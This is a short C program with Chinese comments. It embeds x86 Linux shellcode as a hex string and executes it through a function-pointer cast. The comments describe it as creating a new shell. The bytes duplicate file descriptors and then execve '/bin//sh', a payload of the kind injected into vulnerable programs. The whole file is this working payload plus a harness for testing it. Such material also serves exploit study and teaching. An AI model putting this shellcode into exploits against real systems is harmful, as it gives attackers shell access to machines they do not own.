/*
 * shellcode 
 * 将会创建一个新的shell
 */
#include <stdio.h>
#include <string.h>

/* 注意到将这里的char * shellcode 修改为 char shellcode[]
 * 并将(*(void(*)()) shellcode)(); 修改为：
 *     ((void(*)()) shellcode)();  
 * 之后， 将会发生段错误，原因未知
 */
char *shellcode =
"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\xcd\x80";


int main(void)
{
 printf("Shellcode length: %d\n", strlen(shellcode));
 (*(void(*)()) shellcode)();  
 return 0;
}

